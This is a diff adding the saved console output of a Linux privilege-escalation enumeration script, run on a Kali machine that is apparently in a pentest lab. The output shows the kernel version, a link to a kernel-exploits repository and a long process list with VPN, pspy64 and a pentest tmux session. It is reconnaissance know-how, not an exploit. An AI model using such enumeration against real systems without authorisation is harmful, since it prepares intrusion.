@@ -1,0 +1,2516 @@
+[0;94m      ____       _                       _     _                   [0m
+[0;94m     |  _ \ _ __(_)_   _____  ___  ___  | |   (_)_ __  _   ___  __ [0m
+[0;94m     | |_) | '__| \ \ / / _ \/ __|/ __| | |   | | '_ \| | | \ \/ / [0m
+[0;94m     |  __/| |  | |\ V /  __/\__ \ (__  | |___| | | | | |_| |>  <  [0m
+[0;94m     |_|   |_|  |_| \_/ \___||___/\___| |_____|_|_| |_|\__,_/_/\_\ [0m
+[0;92m                                                                   [0m
+[0;92m      ____          ____                 _____                     [0m
+[0;92m     | __ ) _   _  |  _ \ _ __ ___   ___|___ / ___ ___  ___  _ __  [0m
+[0;92m     |  _ \| | | | | |_) | '__/ _ \ / __| |_ \/ __/ __|/ _ \| '__| [0m
+[0;92m     | |_) | |_| | |  __/| | | (_) | (__ ___) \__ \__ \ (_) | |    [0m
+[0;92m     |____/ \__, | |_|   |_|  \___/ \___|____/|___/___/\___/|_|    [0m
+[0;92m            |___/                                                  [0m
+[0;92m                                                                   [0m
+
+[0;94m###################################################[0m
+[0;94mVersion du kernel                                 #[0m
+[0;94m###################################################[0m
+Linux kali 5.14.0-kali4-amd64 #1 SMP Debian 5.14.16-1kali1 (2021-11-05) x86_64 GNU/Linux
+Find kernel exploits in : https://github.com/lucyoa/kernel-exploits
+
+[0;94m###################################################[0m
+[0;94mProcess list                                      #[0m
+[0;94m###################################################[0m
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1 165536 10936 ?        Ss   Dec16   0:06 /sbin/init splash
+root           2  0.0  0.0      0     0 ?        S    Dec16   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   Dec16   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   Dec16   0:00 [rcu_par_gp]
+root           6  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kworker/0:0H-events_highpri]
+root           8  0.0  0.0      0     0 ?        I<   Dec16   0:00 [mm_percpu_wq]
+root           9  0.0  0.0      0     0 ?        S    Dec16   0:00 [rcu_tasks_rude_]
+root          10  0.0  0.0      0     0 ?        S    Dec16   0:00 [rcu_tasks_trace]
+root          11  0.0  0.0      0     0 ?        S    Dec16   0:00 [ksoftirqd/0]
+root          12  0.1  0.0      0     0 ?        I    Dec16   0:34 [rcu_sched]
+root          13  0.0  0.0      0     0 ?        S    Dec16   0:00 [migration/0]
+root          15  0.0  0.0      0     0 ?        S    Dec16   0:00 [cpuhp/0]
+root          16  0.0  0.0      0     0 ?        S    Dec16   0:00 [cpuhp/1]
+root          17  0.0  0.0      0     0 ?        S    Dec16   0:00 [migration/1]
+root          18  0.0  0.0      0     0 ?        S    Dec16   0:00 [ksoftirqd/1]
+root          20  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kworker/1:0H-events_highpri]
+root          21  0.0  0.0      0     0 ?        S    Dec16   0:00 [cpuhp/2]
+root          22  0.0  0.0      0     0 ?        S    Dec16   0:00 [migration/2]
+root          23  0.0  0.0      0     0 ?        S    Dec16   0:04 [ksoftirqd/2]
+root          25  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kworker/2:0H]
+root          26  0.0  0.0      0     0 ?        S    Dec16   0:00 [cpuhp/3]
+root          27  0.0  0.0      0     0 ?        S    Dec16   0:00 [migration/3]
+root          28  0.0  0.0      0     0 ?        S    Dec16   0:00 [ksoftirqd/3]
+root          30  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kworker/3:0H-events_highpri]
+root          35  0.0  0.0      0     0 ?        S    Dec16   0:00 [kdevtmpfs]
+root          36  0.0  0.0      0     0 ?        I<   Dec16   0:00 [netns]
+root          37  0.0  0.0      0     0 ?        I<   Dec16   0:00 [inet_frag_wq]
+root          38  0.0  0.0      0     0 ?        S    Dec16   0:00 [kauditd]
+root          42  0.0  0.0      0     0 ?        S    Dec16   0:00 [khungtaskd]
+root          43  0.0  0.0      0     0 ?        S    Dec16   0:00 [oom_reaper]
+root          44  0.0  0.0      0     0 ?        I<   Dec16   0:00 [writeback]
+root          45  0.0  0.0      0     0 ?        S    Dec16   0:06 [kcompactd0]
+root          46  0.0  0.0      0     0 ?        SN   Dec16   0:00 [ksmd]
+root          47  0.0  0.0      0     0 ?        SN   Dec16   0:03 [khugepaged]
+root          66  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kintegrityd]
+root          67  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kblockd]
+root          68  0.0  0.0      0     0 ?        I<   Dec16   0:00 [blkcg_punt_bio]
+root          69  0.0  0.0      0     0 ?        I<   Dec16   0:00 [tpm_dev_wq]
+root          70  0.0  0.0      0     0 ?        I<   Dec16   0:00 [edac-poller]
+root          71  0.0  0.0      0     0 ?        I<   Dec16   0:00 [devfreq_wq]
+root          72  0.0  0.0      0     0 ?        I<   Dec16   0:02 [kworker/0:1H-kblockd]
+root          73  0.0  0.0      0     0 ?        S    Dec16   0:01 [kswapd0]
+root          74  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kthrotld]
+root          75  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/24-pciehp]
+root          76  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/25-pciehp]
+root          77  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/26-pciehp]
+root          78  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/27-pciehp]
+root          79  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/28-pciehp]
+root          80  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/29-pciehp]
+root          81  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/30-pciehp]
+root          82  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/31-pciehp]
+root          83  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/32-pciehp]
+root          84  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/33-pciehp]
+root          85  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/34-pciehp]
+root          86  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/35-pciehp]
+root          87  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/36-pciehp]
+root          88  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/37-pciehp]
+root          89  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/38-pciehp]
+root          90  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/39-pciehp]
+root          91  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/40-pciehp]
+root          92  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/41-pciehp]
+root          93  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/42-pciehp]
+root          94  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/43-pciehp]
+root          95  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/44-pciehp]
+root          96  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/45-pciehp]
+root          97  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/46-pciehp]
+root          98  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/47-pciehp]
+root          99  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/48-pciehp]
+root         100  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/49-pciehp]
+root         101  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/50-pciehp]
+root         102  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/51-pciehp]
+root         103  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/52-pciehp]
+root         104  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/53-pciehp]
+root         105  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/54-pciehp]
+root         106  0.0  0.0      0     0 ?        S    Dec16   0:00 [irq/55-pciehp]
+root         107  0.0  0.0      0     0 ?        I<   Dec16   0:00 [acpi_thermal_pm]
+root         109  0.0  0.0      0     0 ?        I<   Dec16   0:00 [mld]
+root         110  0.0  0.0      0     0 ?        I<   Dec16   0:03 [kworker/1:1H-kblockd]
+root         111  0.0  0.0      0     0 ?        I<   Dec16   0:00 [ipv6_addrconf]
+root         121  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kstrp]
+root         124  0.0  0.0      0     0 ?        I<   Dec16   0:00 [zswap-shrink]
+root         125  0.0  0.0      0     0 ?        I<   Dec16   0:00 [kworker/u65:0-hci0]
+root         155  0.0  0.0      0     0 ?        I<   Dec16   0:02 [kworker/3:1H-kblockd]
+root         183  0.0  0.0      0     0 ?        I<   Dec16   0:00 [mpt_poll_0]
+root         184  0.0  0.0      0     0 ?        I<   Dec16   0:00 [mpt/0]
+root         185  0.0  0.0      0     0 ?        I<   Dec16   0:00 [cryptd]
+root         186  0.0  0.0      0     0 ?        I<   Dec16   0:00 [ata_sff]
+root         188  0.0  0.0      0     0 ?        S    Dec16   0:00 [scsi_eh_0]
+root         195  0.0  0.0      0     0 ?        I<   Dec16   0:00 [scsi_tmf_0]
+root         196  0.0  0.0      0     0 ?        S    Dec16   0:00 [scsi_eh_1]
+root         197  0.0  0.0      0     0 ?        I<   Dec16   0:00 [scsi_tmf_1]
+root         198  0.0  0.0      0     0 ?        I<   Dec16   0:00 [ttm_swap]
+root         199  0.0  0.0      0     0 ?        S    Dec16   0:16 [irq/16-vmwgfx]
+root         202  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc0]
+root         203  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc1]
+root         204  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc2]
+root         205  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc3]
+root         206  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc4]
+root         207  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc5]
+root         208  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc6]
+root         209  0.0  0.0      0     0 ?        S    Dec16   0:00 [card0-crtc7]
+root         256  0.0  0.0      0     0 ?        S    Dec16   0:00 [scsi_eh_2]
+root         257  0.0  0.0      0     0 ?        I<   Dec16   0:00 [scsi_tmf_2]
+root         259  0.0  0.0      0     0 ?        I<   Dec16   0:04 [kworker/2:1H-kblockd]
+root         307  0.0  0.0      0     0 ?        S    Dec16   0:11 [jbd2/sda1-8]
+root         308  0.0  0.0      0     0 ?        I<   Dec16   0:00 [ext4-rsv-conver]
+root         361  0.0  0.2  79524 23460 ?        Ss   Dec16   0:02 /lib/systemd/systemd-journald
+root         373  0.0  0.0      0     0 ?        I<   Dec16   0:00 [rpciod]
+root         374  0.0  0.0      0     0 ?        I<   Dec16   0:00 [xprtiod]
+root         379  0.0  0.0 150476   300 ?        Ssl  Dec16   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
+root         387  0.0  0.0  23152  5240 ?        Ss   Dec16   0:00 /lib/systemd/systemd-udevd
+root         481  0.0  0.0   8124  5284 ?        Ss   Dec16   0:00 /usr/sbin/haveged --Foreground --verbose=1
+systemd+     484  0.0  0.0  88660  6032 ?        Ssl  Dec16   0:01 /lib/systemd/systemd-timesyncd
+root         486  0.1  0.1 311904 10128 ?        Ssl  Dec16   0:30 /usr/bin/vmtoolsd
+root         536  0.0  0.0   6684  2900 ?        Ss   Dec16   0:00 /usr/sbin/cron -f
+message+     539  0.0  0.0  10112  5364 ?        Ss   Dec16   0:06 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         543  0.0  0.2 259684 20804 ?        Ssl  Dec16   0:04 /usr/sbin/NetworkManager --no-daemon
+root         546  0.0  0.1 237424  9176 ?        Ssl  Dec16   0:03 /usr/libexec/polkitd --no-debug
+root         547  0.0  0.0 222396  4964 ?        Ssl  Dec16   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         548  0.0  0.0  14380  6912 ?        Ss   Dec16   0:01 /lib/systemd/systemd-logind
+root         555  0.0  0.1 316976 11044 ?        Ssl  Dec16   0:00 /usr/sbin/ModemManager
+root         571  0.0  0.0 310140  7656 ?        SLsl Dec16   0:00 /usr/sbin/lightdm
+root         582  0.0  0.0   5788  1776 tty1     Ss+  Dec16   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root         583  7.0  2.2 509064 179792 tty7    Ssl+ Dec16  26:47 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+rtkit        713  0.0  0.0 153964  2992 ?        SNsl Dec16   0:00 /usr/libexec/rtkit-daemon
+root         770  0.0  0.1 165440  8888 ?        Sl   Dec16   0:00 lightdm --session-child 14 23
+kali         776  0.0  0.1  15888  9268 ?        Ss   Dec16   0:00 /lib/systemd/systemd --user
+kali         777  0.0  0.0 102100  2896 ?        S    Dec16   0:00 (sd-pam)
+kali         797  0.0  0.2  58720 19024 ?        S<sl Dec16   0:00 /usr/bin/pipewire
+kali         798  0.0  0.3 1161672 27656 ?       S<sl Dec16   0:00 /usr/bin/pulseaudio --daemonize=no --log-target=journal
+kali         799  0.0  0.3 464976 31552 ?        Ssl  Dec16   0:04 /usr/bin/wireplumber
+kali         803  0.0  0.0   9432  5136 ?        Ss   Dec16   0:08 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+kali         809  0.0  0.3 270360 25196 ?        Ssl  Dec16   0:01 xfce4-session
+kali         860  0.0  0.0   5984   108 ?        Ss   Dec16   0:00 /usr/bin/ssh-agent x-session-manager
+kali         870  0.0  0.1 312260  9964 ?        Ssl  Dec16   0:00 /usr/libexec/at-spi-bus-launcher
+kali         876  0.0  0.0   8880  4304 ?        S    Dec16   0:01 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+kali         880  0.0  0.1 231384  8192 ?        Sl   Dec16   0:00 /usr/lib/x86_64-linux-gnu/xfce4/xfconf/xfconfd
+kali         886  0.0  0.0 167556  7084 ?        Sl   Dec16   0:04 /usr/libexec/at-spi2-registryd --use-gnome-session
+kali         896  0.0  0.0  81148  3360 ?        SLs  Dec16   0:00 /usr/bin/gpg-agent --supervised
+kali         898  1.3  1.2 1231560 102940 ?      Sl   Dec16   5:07 xfwm4
+kali         901  0.0  0.0 238416  7972 ?        Ssl  Dec16   0:00 /usr/libexec/gvfsd
+kali         906  0.0  0.1 381312  8456 ?        Sl   Dec16   0:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
+kali         926  0.0  0.3 304384 27876 ?        Sl   Dec16   0:03 xfsettingsd
+root         929  0.0  0.1 238944 10404 ?        Ssl  Dec16   0:02 /usr/libexec/upowerd
+kali         934  0.1  0.5 468224 44796 ?        Sl   Dec16   0:34 xfce4-panel
+kali         938  0.0  0.5 410436 47732 ?        Sl   Dec16   0:01 Thunar --daemon
+kali         943  0.0  1.1 575612 97296 ?        Sl   Dec16   0:11 xfdesktop
+kali         944  0.0  0.5 465892 46272 ?        Sl   Dec16   0:04 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so 1 16777223 whiskermenu Whisker Menu Show a menu to easily access installed applications
+kali         949  1.1  0.5 360796 41824 ?        Sl   Dec16   4:18 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libcpugraph.so 13 16777224 cpugraph CPU Graph Graphical representation of the CPU load
+kali         950  0.0  0.3 343288 26304 ?        Sl   Dec16   0:02 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so 14 16777225 systray Status Tray Plugin Provides status notifier items (application indicators) and legacy systray items
+kali         951  0.4  0.4 406076 39000 ?        Sl   Dec16   1:41 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libgenmon.so 15 16777226 genmon Generic Monitor Show output of a command.
+kali         952  0.1  0.5 665936 41736 ?        Sl   Dec16   0:24 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so 16 16777227 pulseaudio PulseAudio Plugin Adjust the audio volume of the PulseAudio sound system
+kali         953  0.0  0.4 389968 38900 ?        Sl   Dec16   0:01 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so 17 16777228 notification-plugin Notification Plugin Notification plugin for the Xfce panel
+kali         954  0.0  0.4 398392 39564 ?        Sl   Dec16   0:06 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so 18 16777229 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display
+kali         955  0.0  0.4 324472 39180 ?        Sl   Dec16   0:01 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so 22 16777230 actions Action Buttons Log out, lock or other system actions
+kali         980  0.0  0.4 470756 38756 ?        Ssl  Dec16   0:02 /usr/lib/x86_64-linux-gnu/xfce4/notifyd/xfce4-notifyd
+kali        1002  0.0  0.1 853348 10868 ?        Sl   Dec16   0:00 xiccd
+kali        1006  0.0  0.2 268652 24176 ?        Sl   Dec16   0:00 /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
+kali        1017  0.0  0.0  16776  2080 ?        Ssl  Dec16   0:02 xcape -e Super_L Control_L Escape
+colord      1026  0.0  0.1 243380 15268 ?        Ssl  Dec16   0:00 /usr/libexec/colord
+kali        1027  0.0  0.0 234980  5016 ?        Sl   Dec16   0:00 /usr/libexec/geoclue-2.0/demos/agent
+kali        1029  0.1  0.4 365652 40468 ?        Sl   Dec16   0:34 /usr/bin/vmtoolsd -n vmusr --blockFd 3
+kali        1038  0.0  0.0 157268  5708 ?        Ssl  Dec16   0:00 /usr/libexec/dconf-service
+kali        1040  0.0  0.6 375072 53172 ?        Sl   Dec16   0:01 /usr/bin/python3 /usr/bin/blueman-applet
+kali        1041  0.0  0.5 557352 46908 ?        Sl   Dec16   0:04 nm-applet
+kali        1042  0.0  0.3 432836 29372 ?        Sl   Dec16   0:01 light-locker
+kali        1050  0.0  0.3 269752 25456 ?        Sl   Dec16   0:01 xfce4-power-manager
+kali        1102  0.0  0.0  45704  6684 ?        Ss   Dec16   0:00 /usr/libexec/bluetooth/obexd
+kali        1114  0.0  0.1 349684 11532 ?        Ssl  Dec16   0:00 /usr/libexec/gvfs-udisks2-volume-monitor
+root        1117  0.0  0.1 394064 14184 ?        Ssl  Dec16   0:00 /usr/libexec/udisks2/udisksd
+kali        1131  0.0  0.0 234372  6216 ?        Ssl  Dec16   0:00 /usr/libexec/gvfs-mtp-volume-monitor
+kali        1135  0.0  0.0 234444  6496 ?        Ssl  Dec16   0:00 /usr/libexec/gvfs-goa-volume-monitor
+kali        1139  0.0  0.0 235448  7132 ?        Ssl  Dec16   0:00 /usr/libexec/gvfs-gphoto2-volume-monitor
+kali        1143  0.0  0.0 311652  7704 ?        Ssl  Dec16   0:01 /usr/libexec/gvfs-afc-volume-monitor
+kali        1154  0.0  0.1 312524 10024 ?        Sl   Dec16   0:00 /usr/libexec/gvfsd-trash --spawner :1.16 /org/gtk/gvfs/exec_spaw/0
+kali        1159  0.0  0.1 160932  8492 ?        Ssl  Dec16   0:00 /usr/libexec/gvfsd-metadata
+kali       14993  0.0  0.1 386288  9772 ?        SLl  Dec16   0:00 /usr/bin/gnome-keyring-daemon --start --foreground --components=secrets
+root       31645  0.0  0.0  11144  5156 ?        S    00:08   0:00 sudo openvpn VPN/petibonum.minus.ovpn
+root       31666 38.6  0.0  11168  7320 ?        S    00:08 114:01 openvpn VPN/petibonum.minus.ovpn
+kali       41941  7.2  0.6 175840 54932 ?        Sl   00:28  19:57 ./pspy64
+root       70635  0.0  0.0  11120  5008 ?        S    01:27   0:00 sudo openvpn petibonum.minus2.ovpn
+root       70636 15.5  0.0  11208  7412 ?        S    01:27  33:52 openvpn petibonum.minus2.ovpn
+kali      102463  0.0  0.1 460128  8232 ?        Sl   02:27   0:00 /usr/libexec/gvfsd-network --spawner :1.16 /org/gtk/gvfs/exec_spaw/1
+kali      102480  0.0  0.1 314808  8696 ?        Sl   02:27   0:00 /usr/libexec/gvfsd-dnssd --spawner :1.16 /org/gtk/gvfs/exec_spaw/3
+root      103576  0.0  0.0  11144  5128 ?        S    02:30   0:00 sudo openvpn VPN/petibonum.minus2.ovpn
+root      103593 18.9  0.0  11448  7316 ?        R    02:30  29:07 openvpn VPN/petibonum.minus2.ovpn
+root      119564  0.0  0.0      0     0 ?        I<   03:01   0:00 [kworker/u65:1-hci0]
+kali      122584 10.8  4.5 3350000 370176 ?      Sl   03:08  12:37 /usr/lib/firefox-esr/firefox-esr
+kali      122724  0.0  1.3 2415460 106316 ?      Sl   03:08   0:03 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 2 -isForBrowser -prefsLen 6164 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+kali      122803  0.1  1.6 2460964 135712 ?      Sl   03:08   0:11 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 4 -isForBrowser -prefsLen 6865 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+kali      123422  0.9  2.5 2590328 208452 ?      Sl   03:08   1:03 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 9 -isForBrowser -prefsLen 7110 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+kali      123897  0.7  0.9 590712 74132 ?        Sl   03:09   0:50 /usr/bin/python3 /usr/bin/terminator
+kali      123925  0.0  0.0  10352  6264 pts/0    Ss   03:09   0:00 /usr/bin/zsh
+kali      124033  0.2  2.0 42463796 170292 ?     SLl  03:09   0:17 /usr/share/code/code --unity-launch
+kali      124036  0.0  0.5 197536 43796 ?        S    03:09   0:00 /usr/share/code/code --type=zygote --no-zygote-sandbox
+kali      124037  0.0  0.5 197536 43216 ?        S    03:09   0:00 /usr/share/code/code --type=zygote
+kali      124047  0.0  0.0 197536  7380 ?        S    03:09   0:00 /usr/share/code/code --type=zygote
+kali      124079  0.0  0.7 265408 59292 ?        Sl   03:09   0:02 /usr/share/code/code --type=utility --utility-sub-type=network.mojom.NetworkService --field-trial-handle=17158379518667433067,224571328520873719,131072 --disable-features=CookiesWithoutSameSiteMustBeSecure,SameSiteByDefaultCookies,SpareRendererForSitePerProcess --lang=en-US --service-sandbox-type=none --enable-crash-reporter=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel --global-crash-keys=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel,_companyName=Microsoft,_productName=VSCode,_version=1.63.1 --user-data-dir=/home/kali/.config/Code --standard-schemes=vscode-webview,vscode-file --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --shared-files=v8_context_snapshot_data:100
+kali      124109  1.4  4.0 53004760 333580 ?     Sl   03:09   1:36 /usr/share/code/code --type=renderer --disable-color-correct-rendering --field-trial-handle=17158379518667433067,224571328520873719,131072 --disable-features=CookiesWithoutSameSiteMustBeSecure,SameSiteByDefaultCookies,SpareRendererForSitePerProcess --lang=en-US --enable-crash-reporter=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel --global-crash-keys=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel,_companyName=Microsoft,_productName=VSCode,_version=1.63.1 --user-data-dir=/home/kali/.config/Code --standard-schemes=vscode-webview,vscode-file --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --app-path=/usr/share/code/resources/app --no-sandbox --no-zygote --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=5 --no-v8-untrusted-code-mitigations --shared-files=v8_context_snapshot_data:100 --vscode-window-config=vscode:316e2389-9d4a-48e9-9207-e92bbeddce02
+kali      124117  0.2  1.6 393768 134640 ?       Sl   03:09   0:19 /usr/share/code/code --type=gpu-process --field-trial-handle=17158379518667433067,224571328520873719,131072 --disable-features=CookiesWithoutSameSiteMustBeSecure,SameSiteByDefaultCookies,SpareRendererForSitePerProcess --disable-color-correct-rendering --enable-crash-reporter=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel --global-crash-keys=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel,_companyName=Microsoft,_productName=VSCode,_version=1.63.1 --user-data-dir=/home/kali/.config/Code --gpu-preferences=UAAAAAAAAAAgAAAQAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAA= --use-gl=swiftshader-webgl --shared-files
+kali      124150  0.0  0.1 214356 15860 ?        S    03:09   0:00 /usr/share/code/code --type=broker
+kali      124196  0.3  1.9 42333200 162092 ?     Sl   03:09   0:22 /usr/share/code/code --type=renderer --disable-color-correct-rendering --field-trial-handle=17158379518667433067,224571328520873719,131072 --disable-features=CookiesWithoutSameSiteMustBeSecure,SameSiteByDefaultCookies,SpareRendererForSitePerProcess --disable-gpu-compositing --lang=en-US --enable-crash-reporter=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel --global-crash-keys=306edb7a-7963-4010-bda5-84c54e9b729b,no_channel,_companyName=Microsoft,_productName=VSCode,_version=1.63.1 --user-data-dir=/home/kali/.config/Code --standard-schemes=vscode-webview,vscode-file --secure-schemes=vscode-webview,vscode-file --bypasscsp-schemes --cors-schemes=vscode-webview,vscode-file --fetch-schemes=vscode-webview,vscode-file --service-worker-schemes=vscode-webview --streaming-schemes --app-path=/usr/share/code/resources/app --no-sandbox --no-zygote --node-integration-in-worker --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=8 --no-v8-untrusted-code-mitigations --shared-files=v8_context_snapshot_data:100 --vscode-window-config=vscode:d23be058-e654-49bd-8464-041687d9cae9 --vscode-window-kind=shared-process
+kali      124217  0.2  1.7 38053608 143004 ?     Sl   03:09   0:16 /usr/share/code/code --ms-enable-electron-run-as-node --inspect-port=0 /usr/share/code/resources/app/out/bootstrap-fork --type=extensionHost --skipWorkspaceStorageLock
+kali      124575  0.1  0.9 38034580 80120 ?      Sl   03:10   0:08 /usr/share/code/code --ms-enable-electron-run-as-node /usr/share/code/resources/app/out/bootstrap-fork --type=ptyHost
+kali      124641  0.0  0.8 38041052 72156 ?      Sl   03:10   0:01 /usr/share/code/code --ms-enable-electron-run-as-node /usr/share/code/resources/app/out/bootstrap-fork --type=watcherServiceParcelSharedProcess
+kali      124657  0.0  0.0  10412  6224 pts/9    Ss+  03:10   0:00 /usr/bin/zsh
+kali      124876  0.0  0.8 37990380 69600 ?      Sl   03:10   0:00 /usr/share/code/code --ms-enable-electron-run-as-node /usr/share/code/resources/app/extensions/json-language-features/server/dist/node/jsonServerMain --node-ipc --clientProcessId=124217
+kali      125616  0.0  0.0   6896  3120 pts/0    S+   03:11   0:00 /bin/bash /usr/bin/pentest
+kali      125629  0.1  0.0  12112  7188 ?        Ss   03:11   0:07 tmux new-session -s Pentest -d
+kali      125630  0.0  0.0  15228  7800 pts/10   Ss   03:11   0:02 -zsh
+kali      125639  0.0  0.0  10416  6200 pts/5    Ss   03:11   0:00 -zsh
+kali      125646  0.1  0.0  10312  6164 pts/8    Ss   03:11   0:13 -zsh
+kali      125661  0.0  0.0  13796  7696 pts/11   Ss   03:11   0:02 -zsh
+kali      125666  0.0  0.0  13484  6944 pts/6    Ss   03:11   0:01 -zsh
+kali      125669  0.0  0.0   8388  3632 pts/0    S+   03:11   0:00 tmux attach-session -t Pentest:2.2
+kali      127709  8.2  1.6 2551128 135368 ?      Sl   03:15   8:55 /usr/lib/firefox-esr/firefox-esr -contentproc -childID 13 -isForBrowser -prefsLen 8825 -prefMapSize 220538 -parentBuildID 20210901125844 -appdir /usr/lib/firefox-esr/browser 122584 true tab
+kali      128688  0.0  0.0   7216   880 pts/5    S+   03:17   0:01 ping 10.10.121.56
+root      139916  0.0  0.0  11120  5036 pts/10   S+   03:34   0:00 sudo openvpn petibonum.minus.ovpn
+root      139917  0.0  0.0  11072  7452 pts/10   S+   03:34   0:03 openvpn petibonum.minus.ovpn
+kali      141510  0.0  0.0 364480  6448 ?        Sl   03:37   0:00 /usr/lib/speech-dispatcher-modules/sd_dummy /etc/speech-dispatcher/modules/dummy.conf
+kali      141513  0.0  0.0 158300  2264 ?        Ssl  03:37   0:00 /usr/bin/speech-dispatcher --spawn --communication-method unix_socket --socket-path /run/user/1000/speech-dispatcher/speechd.sock
+root      144926  0.0  0.0      0     0 ?        I    03:44   0:01 [kworker/3:1-events]
+kali      148625  0.0  0.0  13564  7300 pts/7    Ss   03:51   0:00 -zsh
+kali      148789  0.0  0.1  14528  9120 pts/7    S+   03:51   0:00 vim priv1.txt
+kali      148806  0.0  0.0  13484  6932 pts/12   Ss   03:51   0:00 -zsh
+kali      148933  0.0  0.1  14524  9160 pts/12   S+   03:52   0:00 vim sudo
